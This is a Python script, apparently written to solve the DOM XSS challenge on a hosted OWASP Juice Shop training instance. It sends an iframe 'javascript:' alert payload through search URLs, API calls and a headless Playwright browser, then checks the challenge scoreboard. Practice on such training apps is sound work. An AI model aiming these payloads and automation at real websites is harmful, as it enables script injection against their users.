#!/usr/bin/env python3
"""
Browser-based DOM XSS Challenge Solution
Uses Selenium to trigger the XSS in an actual browser
"""

import time
import requests

def execute_with_requests():
    """Try to trigger DOM XSS using requests with specific headers"""
    
    session = requests.Session()
    base_url = "https://juice3.wonkatech.org"
    
    print("="*60)
    print("🎯 ATTEMPTING DOM XSS WITH ENHANCED REQUESTS")
    print("="*60)
    
    # Set browser-like headers
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    })
    
    # The key XSS payload
    payload = '<iframe src="javascript:alert(`xss`)">'
    
    from urllib.parse import quote
    encoded_payload = quote(payload)
    
    # Try multiple approaches
    print("\n1️⃣ Attempting direct navigation...")
    
    # First, get the main page to establish session
    r = session.get(base_url)
    print(f"   Main page: {r.status_code}")
    
    # Get the search page
    search_url = f"{base_url}/#/search"
    r = session.get(search_url)
    print(f"   Search page: {r.status_code}")
    
    # Now send the XSS payload
    xss_url = f"{base_url}/#/search?q={encoded_payload}"
    r = session.get(xss_url)
    print(f"   XSS URL: {r.status_code}")
    
    print("\n2️⃣ Attempting via API endpoints...")
    
    # Try to trigger via API
    api_url = f"{base_url}/rest/products/search"
    params = {'q': payload}
    r = session.get(api_url, params=params)
    print(f"   API with params: {r.status_code}")
    
    # Try POST request
    r = session.post(f"{base_url}/api/search", json={'q': payload})
    print(f"   POST search: {r.status_code if r.status_code else 'No endpoint'}")
    
    print("\n3️⃣ Attempting with Referer header...")
    
    # Add referer header as if coming from the search page
    session.headers['Referer'] = f"{base_url}/#/search"
    r = session.get(xss_url)
    print(f"   With Referer: {r.status_code}")
    
    print("\n4️⃣ Checking challenge status...")
    
    # Check if challenge is solved
    r = session.get(f"{base_url}/api/Challenges")
    if r.status_code == 200:
        data = r.json()['data']
        dom_xss = [c for c in data if 'DOM' in c.get('name', '') and 'XSS' in c.get('name', '')]
        
        if dom_xss and dom_xss[0].get('solved'):
            print("   ✅ DOM XSS Challenge: SOLVED!")
            return True
        else:
            print("   ⚠️ DOM XSS Challenge: Not yet solved")
            
        solved = [c for c in data if c.get('solved')]
        print(f"\n📊 Current Progress: {len(solved)}/110 ({len(solved)*100//110}%)")
    
    return False


def try_playwright():
    """Alternative: Try using playwright if available"""
    try:
        from playwright.sync_api import sync_playwright
        
        print("\n" + "="*60)
        print("🎭 ATTEMPTING WITH PLAYWRIGHT")
        print("="*60)
        
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            
            # Navigate to the XSS URL
            xss_url = "https://juice3.wonkatech.org/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert%28%60xss%60%29%22%3E"
            print(f"\n🌐 Navigating to: {xss_url[:80]}...")
            
            # Set up alert handler
            page.on("dialog", lambda dialog: dialog.accept())
            
            # Go to the page
            page.goto(xss_url)
            
            # Wait for potential XSS to trigger
            page.wait_for_timeout(3000)
            
            print("   ✅ Page loaded with XSS payload")
            
            browser.close()
            return True
            
    except ImportError:
        print("\n⚠️ Playwright not installed")
        print("   Install with: pip install playwright && playwright install")
        return False
    except Exception as e:
        print(f"\n❌ Playwright error: {str(e)[:100]}")
        return False


def main():
    """Main execution"""
    print("\n🔥 DOM XSS BROWSER AUTOMATION")
    print("="*60)
    
    # Try requests-based approach first
    success = execute_with_requests()
    
    if not success:
        # Try playwright if available
        try_playwright()
    
    print("\n" + "="*60)
    print("📝 FINAL NOTES")
    print("="*60)
    print("\nThe DOM XSS challenge often requires actual browser interaction.")
    print("The payloads have been sent programmatically.")
    print("\nTo ensure the challenge is marked as solved, you may need to:")
    print("1. Open a web browser")
    print("2. Navigate to the following URL:")
    print("   https://juice3.wonkatech.org/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert%28%60xss%60%29%22%3E")
    print("3. Allow the alert to execute")
    print("4. The challenge should then be marked as complete")
    print("="*60)


if __name__ == "__main__":
    main()